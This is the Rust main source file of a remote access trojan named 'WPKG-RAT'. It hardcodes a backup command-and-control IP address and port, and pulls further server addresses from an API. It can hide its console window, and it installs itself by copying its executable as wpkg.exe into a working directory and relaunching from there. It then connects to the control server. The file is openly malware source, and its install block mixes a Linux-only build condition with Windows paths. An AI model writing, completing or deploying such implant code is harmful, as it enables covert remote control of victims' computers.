// Remove console window in Windows OS
//#![windows_subsystem = "windows"]
// TODO: delete it
#![allow(dead_code)]

mod addreses;
mod client;
mod globals;
mod logger;
mod macros;
mod unwrap;
mod utils;

use std::sync::Mutex;

use lazy_static::lazy_static;
use tracing::*;

use crate::addreses::{Address, Adresses};

/// Server ip backup if api isn't available
pub const TCP_BACKUP_IP: &str = "136.243.156.104";
/// Server port backup if api isn't available
pub const TCP_BACKUP_PORT: u32 = 3217;

lazy_static! {
    pub static ref TCP_ADDRESS: Mutex<Vec<Address>> = Mutex::new(vec![Address::default()]);
}

#[tokio::main]
async fn main() {
    println!("WPKG-RAT {}", env!("CARGO_PKG_VERSION"));

    // get tcp server ip address from the api
    let tcp_adress = Adresses::get().await.unwrap_or_default();
    update_mutex!(TCP_ADDRESS, tcp_adress.tcp);

    // init logger
    logger::init();

    #[cfg(not(target_os = "windows"))]
    warn!("RAT isn't runned on Windows. Some features may be unavailable. Use for debug only");

    #[cfg(target_os = "linux")]
    {
        use crate::utils::Utils;
        use std::env;
        use std::fs;
        use std::process;
        use std::path::Path;
        use sysinfo::{System, SystemExt};

        let install = || -> anyhow::Result<()> {
            let exe_path = env::current_exe()?.display().to_string();

            let config_dir = Utils::get_working_dir();
            let exe_target = format!("{}\\{}", &config_dir, "wpkg.exe");

            Utils::messagebox(format!("{} - {}",exe_path,exe_target));

            if exe_path != exe_target {
                info!("WPKG not installed. Installing in {}...", &config_dir);

                if !Path::new(&exe_target).exists()
                {
                    info!("Copying WPKG executable to {}...",exe_target);
                    fs::copy(exe_path, exe_target.clone())?;
                }

                //check if process is runned
                let mut runned: i32 = 0;
                let s = System::new_all();
                for _ in s.processes_by_name("wpkg.exe")
                {
                    runned += 1;
                }

                //run wpkg
                if runned <= 1
                {
                    info!("Running WPKG...");
                    Utils::run_process_with_work_dir(&exe_target, "", false,&config_dir);
                }
                else
                {
                    error!("WPKG is runned. Exiting...");
                }

                process::exit(0);
            }
            Ok(())
        };

        if let Err(err) = install() {
            error!("Failed to install WPKG: {}", err);
            process::exit(0);
        }
    }

    // connect to the ServerD
    client::connect().await;
}

